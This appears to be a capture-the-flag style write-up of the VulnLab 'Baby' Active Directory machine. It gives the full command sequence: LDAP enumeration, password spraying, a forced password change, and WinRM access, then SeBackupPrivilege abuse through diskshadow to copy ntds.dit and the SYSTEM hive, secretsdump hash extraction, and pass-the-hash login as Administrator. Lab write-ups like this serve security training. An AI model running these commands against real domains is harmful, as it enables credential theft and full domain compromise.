---
layout: post
title: VulnLab - Baby
date: 15-04-2025
categories: [Machines]
tags: [ldap, anonymous, SeBackupPrivilege, smbpasswd]
image: "https://images-ext-1.discordapp.net/external/iTsNgpEcu1U88J1FvpyBi4VwhZZRBo0W6Rd5ARdznbE/https/assets.vulnlab.com/baby_slide.png?format=webp&quality=lossless"
---

## Intoduction
In this write-up, I’ll walk you through the Active Directory lab "Baby" from Vulnlab, a solo Windows machine designed for junior-level users exploring Active Directory exploitation. The lab focuses on two fundamental techniques: LDAP enumeration, which involves querying the domain for information about users, groups, and other AD objects, and Windows privilege escalation through the abuse of SeBackupPrivilege, a misconfigured right that can be leveraged to gain SYSTEM-level access. 

## Scanning

```bash
➜  Baby nmap -Pn -T4 -sC -sV -p- 10.10.116.106 -oN reports/all_tcp.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-13 03:14 EAT
Nmap scan report for 10.10.116.106 (10.10.116.106)
Host is up (0.19s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-13 00:24:14Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-04-13T00:25:46+00:00; +4s from scanner time.
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2025-04-11T23:48:27
|_Not valid after:  2025-10-11T23:48:27
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-04-13T00:25:06+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
60933/tcp open  msrpc         Microsoft Windows RPC
60948/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3s, deviation: 0s, median: 3s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-13T00:25:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 670.17 seconds

```

## Enumeration

### LDAP

**Anonymous Access**

```bash
ldapsearch -x -H ldap://10.10.116.106 -b "DC=baby,DC=vl"
```

**Users**

```bash
ldapsearch -x -H ldap://10.10.116.106 -b "DC=baby,DC=vl" -D 'baby.vl' 'objectClass=user' | grep "sAMAccountName:" | cut -d' ' -f2 | tee loots/users.txt
```
![alt text](/assets/screenshots/baby/1.png)

Descriptions

```bash
ldapsearch -x -H ldap://10.10.116.106 -b "DC=baby,DC=vl" -D 'baby.vl' 'objectClass=user' | grep "description:"
```
![alt text](/assets/screenshots/baby/2.png)

### SMB

```bash
nxc smb 10.10.116.106 -u loots/users.txt -p 'BabyStart123!' --continue-on-success
```
![alt text](/assets/screenshots/baby/3.png)

Password Change

```bash
smbpasswd -r 10.10.116.106 -U Caroline.Robinson
```

![alt text](/assets/screenshots/baby/4.png)

![alt text](/assets/screenshots/baby/5.png)

```bash
nxc smb 10.10.116.106 -u Caroline.Robinson -p 'NewSecurePass123!' --users
```

![alt text](/assets/screenshots/baby/6.png)

### Bloodhound

```bash
bloodhound-python -d baby.vl  -c all -u 'Caroline.Robinson' -p 'NewSecurePass123!'  -ns 10.10.116.106 --zip
```

![alt text](/assets/screenshots/baby/7.png)

First Degree Group Membership

![alt text](/assets/screenshots/baby/8.png)

## Initial Access

```bash
nxc winrm 10.10.116.106 -u Caroline.Robinson -p 'NewSecurePass123!'
```

![alt text](/assets/screenshots/baby/9.png)

```bash
evil-winrm -i 10.10.116.106 -u Caroline.Robinson -p 'NewSecurePass123!'
```

![alt text](/assets/screenshots/baby/10.png)

## PrivEsc

![alt text](/assets/screenshots/baby/11.png)

vss.dsh

```bash
set context persistent nowriters
set metadata c:\programdata\cyb4x.cab
set verbose on
add volume c: alias cyb4x
create
expose %cyb4x% z:
```

![alt text](/assets/screenshots/baby/12.png)

```bash
diskshadow /s vss.dsh
```

![alt text](/assets/screenshots/baby/13.png)

Copying

```bash
robocopy /b z:\windows\ntds . ntds.dit
```

![alt text](/assets/screenshots/baby/14.png)

also

```bash
reg.exe save hklm\system system
```

download

![alt text](/assets/screenshots/baby/15.png)

Dump secrets

```bash
secretsdump.py -system system -ntds ntds.dit local
```

![alt text](/assets/screenshots/baby/16.png)

Access as administrator

```bash
evil-winrm -i 10.10.89.186 -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
```

![alt text](/assets/screenshots/baby/17.png)